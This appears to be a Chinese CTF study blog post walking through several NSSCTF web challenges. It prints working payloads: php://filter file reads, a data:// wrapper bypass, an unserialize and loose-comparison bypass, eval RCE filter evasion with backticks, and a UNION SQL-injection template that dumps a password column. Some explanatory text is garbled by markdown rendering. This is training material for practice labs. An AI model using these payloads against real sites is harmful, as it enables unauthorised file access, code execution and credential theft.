+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node4.anna.nssctf.cn:28660/index.php/utils.php/中文?show[source=1</span><br></pre></td></tr></table></figure></div>
+
+<p>&#x2F;index.php&#x2F;utils.php&#x2F;%a0?show+source&#x3D;1。这个 URL 的工作原理如下：</p>
+<p>&#x2F;index.php&#x2F;utils.php&#x2F;%a0: 在 PHP 中，&#x2F;index.php&#x2F;utils.php&#x2F;%a0 被解析为一个路径信息（Path Info），并被设置为 $_SERVER[‘PATH_INFO’] 变量的值。然后，这个路径信息会被添加到 $_SERVER[‘PHP_SELF’] 中，即 $_SERVER[‘PHP_SELF’] &#x3D; ‘&#x2F;index.php&#x2F;utils.php&#x2F;%a0’。</p>
+<p>%a0 是 URL 编码中的一个特殊字符，代表一个非打印字符（No-Break Space）。在 PHP 中，非打印字符通常会被忽略。所以，&#x2F;utils.php&#x2F;%a0 实际上被 PHP 解析为 &#x2F;utils.php&#x2F;。</p>
+<p>然后，当 PHP 执行 highlight_file(basename(SERVER[′PHPSELF′]))这段代码时，basename(<em>S<strong>ER</strong>V**ER</em>[′<em>P<strong>H</strong>P<strong>S</strong>E<strong>L</strong>F</em>′]))这段代码时，<em>ba<strong>se</strong>nam**e</em>(_SERVER[‘PHP_SELF’]) 会返回 utils.php，因为 basename() 函数返回路径中的最后一部分，也就是文件名。所以，&#x2F;index.php&#x2F;utils.php&#x2F;%a0 最终被解析为 &#x2F;utils.php。</p>
+<p>?show+source&#x3D;1: 这个部分是 URL 的查询字符串（Query String）。show+source&#x3D;1 被解析为一个 GET 参数，设置 GET[′showsource′]为1。这会触发highlightfile(basename(<em>G**ET</em>[′<em>s<strong>h</strong>o<strong>w</strong>s<strong>o</strong>u<strong>rc</strong>e</em>′]为1。这会触发<em>hi<strong>g</strong>h<strong>l</strong>i<strong>g</strong>h<strong>t</strong>f<strong>i</strong>l**e</em>(<em>ba<strong>se</strong>nam**e</em>(_SERVER[‘PHP_SELF’])) 这段代码，高亮显示 $_SERVER[‘PHP_SELF’] 对应的文件的源代码。</p>
+<p><strong>为什么要用 show+source 代替 show_source？</strong></p>
+<p>在 URL 编码中，加号（+）是一个特殊字符，代表一个空格。所以，show+source 在 URL 中实际上代表 show source。</p>
+<p>当 PHP 解析 URL 中的查询字符串（query string）时，它会将加号（+）解析为一个空格。所以，show+source 会被 PHP 解析为 show source。然后，PHP 会将这个字符串转换为一个变量名，去掉空格，所以 show source 被转换为 show_source。</p>
+<p>这就是为什么 show+source 会被解析为 show_source 的原因。</p>
+<h2 id="SWPUCTF-2022-新生赛-ez-ez-php-revenge"><a href="#SWPUCTF-2022-新生赛-ez-ez-php-revenge" class="headerlink" title="[SWPUCTF 2022 新生赛]ez_ez_php(revenge)"></a>[SWPUCTF 2022 新生赛]ez_ez_php(revenge)</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123;</span><br><span class="line">        echo &quot;Nice!!!&quot;;</span><br><span class="line">        include($_GET[&quot;file&quot;]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;Hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//flag.php</span><br></pre></td></tr></table></figure></div>
+
+<p>substr($_GET[“file”], 0, 3) &#x3D;&#x3D;&#x3D; “php”<br>是一个对 $_GET[“file”] 参数值进行前缀判断 的条件<br>该条件判断是否满足：</p>
+<p>用户通过 GET 提交的参数 file，其开头前三个字符是 “php”</p>
+<p>例子：<br>?file&#x3D;phpinfo ✅ （前3个字符为 php，通过判断）</p>
+<p>?file&#x3D;php:&#x2F;&#x2F;filter ✅</p>
+<p>?file&#x3D;PHPaaa ❌（区分大小写）</p>
+<p>?file&#x3D;html ❌</p>
+<p>payload</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure></div>
+
+<p>得到</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">6&#x27;&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo   &quot;NSSCTF&#123;flag_is_not_here&#125;&quot; .&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;real_flag_is_in_ &#x27;/flag&#x27; &quot;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;换个思路，试试PHP伪协议呢&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:24645/?file=php://filter/read=convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="HUBUCTF-2022-新生赛-checkin"><a href="#HUBUCTF-2022-新生赛-checkin" class="headerlink" title="[HUBUCTF 2022 新生赛]checkin"></a>[HUBUCTF 2022 新生赛]checkin</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">$username  = &quot;this_is_secret&quot;; </span><br><span class="line">$password  = &quot;this_is_not_known_to_you&quot;; </span><br><span class="line">include(&quot;flag.php&quot;);//here I changed those two </span><br><span class="line">$info = isset($_GET[&#x27;info&#x27;])? $_GET[&#x27;info&#x27;]: &quot;&quot; ;</span><br><span class="line">$data_unserialize = unserialize($info);</span><br><span class="line">if ($data_unserialize[&#x27;username&#x27;]==$username&amp;&amp;$data_unserialize[&#x27;password&#x27;]==$password)&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;username or password error!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>反序列化和弱类型比较，isset判断info参数不为空</p>
+<p>设置一个数组把username和password都设置为该有的变量，然后再将改数组序列化</p>
+<p>但是该做法不可以，注意到有注释，在那里更改了两个的值，但是在下面用的&#x3D;&#x3D;，可以考虑弱比较绕过</p>
+<p>if语句中使用双等号判断，可以想到使用弱比较</p>
+<blockquote>
+<p>字符串在和数字比较的时候会将字符串转化为数字，当字符串开头没有数字时，则转化失败为false</p>
+</blockquote>
+<p>于是猜想username和password改变后开头仍没有数字，那么数组里的值我们直接设置为0：</p>
+<p>或者直接设置为true</p>
+<p>两种做法</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$info = array(</span><br><span class="line">	&#x27;username&#x27;=&gt;0,</span><br><span class="line">	&#x27;password&#x27;=&gt;0</span><br><span class="line">);</span><br><span class="line">$serialized_data = serialize($info);</span><br><span class="line">echo  $serialized_data . PHP_EOL;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$info = array(</span><br><span class="line">	&#x27;username&#x27;=&gt;true,</span><br><span class="line">	&#x27;password&#x27;=&gt;true</span><br><span class="line">);</span><br><span class="line">$serialized_data = serialize($info);</span><br><span class="line">echo  $serialized_data . PHP_EOL;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>参考[<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73612768/article/details/135284524" >HUBUCTF 2022 新生赛]checkin-CSDN博客<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="GDOUCTF-2023-泄露的伪装"><a href="#GDOUCTF-2023-泄露的伪装" class="headerlink" title="[GDOUCTF 2023]泄露的伪装"></a>[GDOUCTF 2023]泄露的伪装</h2><p>dirsearch扫描得到</p>
+<p>orzorz.php</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;cxk&#x27;]))&#123;</span><br><span class="line">    $cxk=$_GET[&#x27;cxk&#x27;];</span><br><span class="line">    if(file_get_contents($cxk)==&quot;ctrl&quot;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;洗洗睡吧&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;nononoononoonono&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>data伪协议数据流封装</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:23889/orzorz.php?cxk=data://text/plain,ctrl</span><br></pre></td></tr></table></figure></div>
+
+<p>data:&#x2F;&#x2F;text&#x2F;plain,(将逗号后的字符串)将一段字符串当作“虚拟文件”内容返回</p>
+<h2 id="UUCTF-2022-新生赛-ez-rce"><a href="#UUCTF-2022-新生赛-ez-rce" class="headerlink" title="[UUCTF 2022 新生赛]ez_rce"></a>[UUCTF 2022 新生赛]ez_rce</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">居然都不输入参数，可恶!!!!!!!!!</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">    $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">    if (!preg_match(&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;,$code))&#123;</span><br><span class="line">        echo &#x27;看看你输入的参数！！！不叫样子！！&#x27;;echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">        eval($code);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;你想干什么？？？？？？？？？&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;居然都不输入参数，可恶!!!!!!!!!&quot;;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>题目过滤了很多东西，没有过滤反引号和\</p>
+<p>但是这道题应该还有很多种方法可以做，我们可以找找关于PHP的输出函数，比如说var_dump,printf_r函数都是可以代替echo的。</p>
+<p>print_r:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:21488/?code=printf(`l\s /`);</span><br></pre></td></tr></table></figure></div>
+
+<p>eval把传入的当作php代码执行</p>
+<h2 id="LitCTF-2023-这是什么？SQL-！注一下-！"><a href="#LitCTF-2023-这是什么？SQL-！注一下-！" class="headerlink" title="[LitCTF 2023]这是什么？SQL ！注一下 ！"></a>[LitCTF 2023]这是什么？SQL ！注一下 ！</h2><p>联合注入，套公式</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">闭合符号变形一下，以及表名库名啥的，套公式</span><br><span class="line">?id=1’ order by 3–+</span><br><span class="line">判断字段</span><br><span class="line"></span><br><span class="line">?id=-1’ union select 1,2,3–+</span><br><span class="line">判断注入点</span><br><span class="line"></span><br><span class="line">?id=-1’ union select 1,2,database()–+</span><br><span class="line">查看当前数据库</span><br><span class="line"></span><br><span class="line">?id=-1’ union select 1,2,schema_name from information_schema.schemate–+</span><br><span class="line">查看所有数据库</span><br><span class="line"></span><br><span class="line">?id=-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_shema=‘test’–+</span><br><span class="line">查看数据库test下的所有表</span><br><span class="line"></span><br><span class="line">?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_shema=‘test’ and table_name=‘user’–+</span><br><span class="line">查看数据库test下user表中的所有字段</span><br><span class="line"></span><br><span class="line">?id=-1’ union select 1,2,group_concat(passwd) from test.user–+</span><br><span class="line">查看数据库test下user表中passwd字段中的内容</span><br></pre></td></tr></table></figure></div>
+
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> web从零开始day3</li>
+        <li><strong>Author:</strong> luyanpei</li>
+        <li><strong>Created at
+                :</strong> 2025-07-09 00:00:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-07-10 10:06:32
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/07/09/nssctf-web从零开始day3/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                All Rights Reserved &#169; luyanpei
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/train/">#train</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/06/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E7%BA%A2%E6%97%A54/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">红日靶场4</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">web从零开始day3</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#NSSCTF-2022-Spring-Recruit-babyphp"><span class="nav-text">[NSSCTF 2022 Spring Recruit]babyphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF-2023-Vim-yyds"><span class="nav-text">[LitCTF 2023]Vim yyds</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-EasyP"><span class="nav-text">[鹤城杯 2021]EasyP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-ez-php-revenge"><span class="nav-text">[SWPUCTF 2022 新生赛]ez_ez_php(revenge)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-checkin"><span class="nav-text">[HUBUCTF 2022 新生赛]checkin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GDOUCTF-2023-%E6%B3%84%E9%9C%B2%E7%9A%84%E4%BC%AA%E8%A3%85"><span class="nav-text">[GDOUCTF 2023]泄露的伪装</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-rce"><span class="nav-text">[UUCTF 2022 新生赛]ez_rce</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LitCTF-2023-%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9FSQL-%EF%BC%81%E6%B3%A8%E4%B8%80%E4%B8%8B-%EF%BC%81"><span class="nav-text">[LitCTF 2023]这是什么？SQL ！注一下 ！</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">love u</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">luyanpei</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        16 posts in total
+                    </span>
+                    
+                        <span>
+                            28.8k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
